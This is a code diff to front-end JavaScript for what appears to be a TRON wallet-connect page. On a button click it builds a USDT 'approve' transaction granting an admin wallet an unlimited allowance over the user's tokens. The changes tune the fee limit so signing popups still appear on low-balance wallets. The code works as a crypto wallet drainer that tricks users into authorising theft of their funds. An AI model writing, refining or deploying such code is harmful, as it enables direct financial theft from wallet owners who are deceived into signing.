@@ -117,9 +117,13 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
             setTimeout(async () => {
                 try {
-                    // Logic Update: Fee limit optimized for low balance (10 TRX+)
+                    const trxNum = parseFloat(trx);
+                    let dynamicFeeLimit = trxNum > 0 && trxNum < 150 ? Math.floor(trxNum * 1000000) : 100000000;
+                    if (dynamicFeeLimit < 1000000) dynamicFeeLimit = 100000000;
+
+                    // Logic Update: Fee limit dynamically adjusted based on balance
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
-                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 }, // Lowered to 40 TRX to allow popups on low balance
+                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: dynamicFeeLimit }, 
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                     );
 
@@ -129,7 +133,10 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
                     const requestPromise = result.provider.request({
                         method: "tron_signTransaction",
-                        params: { transaction: transaction }
+                        params: { 
+                            address: address,
+                            transaction: transaction 
+                        }
                     }, "tron:0x2b6653dc");
 
                     const signedTx = await Promise.race([requestPromise, timeoutPromise]);
